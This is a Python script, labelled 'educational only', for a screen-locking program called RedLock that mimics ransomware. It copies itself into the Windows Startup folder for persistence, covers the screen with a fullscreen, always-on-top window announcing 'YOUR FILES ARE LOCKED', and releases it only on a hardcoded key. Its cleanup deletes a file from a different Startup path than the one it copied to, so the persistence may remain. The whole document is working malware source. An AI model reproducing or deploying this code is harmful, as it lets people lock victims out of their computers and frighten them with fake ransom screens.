# created by K807 (EDUCATIONAL ONLY)
import os
import sys
import shutil
import threading
import tkinter as tk
from tkinter import messagebox

KEY = "11.11.11.11"
FILE_TO_DELETE = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\redlock.exe"

path_app = os.path.abspath(sys.argv[0])

run_start = os.path.join(
    os.getenv("APPDATA"),
    "Microsoft",
    "Windows",
    "Start Menu",
    "Programs",
    "Startup"
)
name = os.path.join(run_start, "redlock.exe")

if not os.path.exists(name):
    shutil.copy(path_app, name)

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.config(bg="red")
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")


def check_key():
    if entry.get() == KEY:
        try:
            if os.path.exists(FILE_TO_DELETE):
                os.remove(FILE_TO_DELETE)
                messagebox.showinfo("Unlocked", "Correct key\nFile deleted.")
            else:
                messagebox.showinfo("Unlocked", "Correct key\nFile not found.")
        except PermissionError:
            messagebox.showerror("Error", "Run program as Administrator!")

        root.destroy()
    else:
        messagebox.showerror("Error", "WTF Wrong key")

tk.Label(
    root,
    text="YOUR FILES ARE LOCKED",
    fg="white",
    bg="red",
    font=("Courier", 28, "bold")
).pack(pady=20)


ascii_art = """
██████╗ ███████╗██████╗ ██╗      ██████╗  ██████╗██╗  ██╗
██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝
██████╔╝█████╗  ██║  ██║██║     ██║   ██║██║     █████╔╝ 
██╔══██╗██╔══╝  ██║  ██║██║     ██║   ██║██║     ██╔═██╗ 
██║  ██║███████╗██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗
╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
"""

ascii_label = tk.Label(
    root,
    text=ascii_art,
    fg="black",
    bg="red",
    font=("Courier", 14),
    justify="center"
)
ascii_label.place(relx=0.5, rely=0.5, anchor="center")


entry = tk.Entry(
    root,
    font=("Courier", 18),
    justify="center",
    bd=0,
    width=20
)
entry.pack(pady=15)

tk.Button(
    root,
    text="UNLOCK",
    font=("Courier", 14),
    command=check_key
).pack(pady=10)



tk.Label(
    root,
    text="Project Link: https://github.com/K807-PRo/RedLock.git",
    fg="white",
    bg="red",
    font=("Courier", 10)
).pack(side="bottom", pady=10)

threading.Thread(target=check_key, daemon=True).start()

root.resizable(False , False)

root.mainloop()